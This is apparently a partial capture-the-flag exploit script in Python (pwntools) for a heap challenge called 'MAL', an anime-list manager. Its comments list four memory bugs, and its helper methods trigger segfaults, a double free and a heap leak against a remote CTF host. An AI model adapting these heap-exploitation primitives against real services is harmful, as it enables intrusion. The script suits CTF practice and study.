#!/usr/bin/env python3
from pwn import *


'''
AnimeList *ListArray[15];

// malloc(0x10)
struct AnimeList {
    AnimeEntry *items;
    uint64_t count;
}

// malloc(0x20)
struct AnimeEntry {
    char * title;   // malloc(0x80), read_buf(0x80)
    char * review;  // malloc(0x100), read_buf(0x80)
    uint64_t score; // 0-100
    AnimeEntry *next;
}
'''

# bug#1 in delete_list():
# no "if (ListArray[i] == 0) ..."

# bug#2 in delete_list() if list not empty:
# no "ListArray[i]->items = 0"
# no "ListArray[i]->count--"

# bug#3 in free_entry():
# no "entry->title = 0"
# no "entry->review = 0"

# bug#4 in change_review():
# no "free(title_to_find)"


class Exploit:
    def __init__(self, proc):
        self.p = proc

    def read_hello(self):
        self.p.readuntil(b'>')

    def create_list(self):
        self.read_hello()

        self.p.sendline(b'1')
        line = self.p.readline()
        list_index = int(line.split(b' ')[-1])
        return list_index

    def delete_list(self, idx):
        self.read_hello()

        self.p.sendline(b'2')
        self.p.readuntil(b':')
        self.p.sendline(str(idx).encode('ascii'))

    def add_anime(self, list_idx, title, review, score):
        self.read_hello()

        self.p.sendline(b'3')
        self.p.readuntil(b':')
        self.p.sendline(str(list_idx).encode('ascii'))
        self.p.readuntil(b':')
        self.p.sendline(title.encode('ascii'))
        self.p.readuntil(b':')
        self.p.sendline(review.encode('ascii'))
        self.p.readuntil(b':')
        self.p.sendline(str(score).encode('ascii'))

    def delete_anime(self, list_idx, title):
        self.read_hello()

        self.p.sendline(b'5')
        self.p.readuntil(b':')
        self.p.sendline(str(list_idx).encode('ascii'))
        self.p.readuntil(b':')
        self.p.sendline(title.encode('ascii'))

    def view_list(self, idx):
        self.read_hello()

        self.p.sendline(b'6')
        self.p.readuntil(b':')
        self.p.sendline(str(idx).encode('ascii'))
    
    def segfault(self):
        self.delete_list(0)

    def double_free(self):
        idx = self.create_list()
        self.add_anime(idx, 'a', 'a', 0)
        self.delete_list(idx)
        self.delete_list(idx)

    def segfault2(self):
        idx = self.create_list()
        self.add_anime(idx, 'a', 'a', 0)
        self.delete_list(idx)
        self.delete_anime(idx, 'a')

    def get_heap_data(self):
        idx = self.create_list()
        self.add_anime(idx, 'a', 'a', 0)
        self.add_anime(idx, 'a', 'a', 0)
        self.add_anime(idx, 'a', 'a', 0)
        self.add_anime(idx, 'a', 'a', 0)
        self.add_anime(idx, 'a', 'a', 0)
        self.add_anime(idx, 'a', 'a', 0)
        self.add_anime(idx, 'a', 'a', 0)
        self.delete_list(idx)
        self.view_list(idx)



#p = process('./MAL')
p = remote('ctf-t.orb.ru', 37173)

e = Exploit(p)

#e.segfault2()

p.interactive()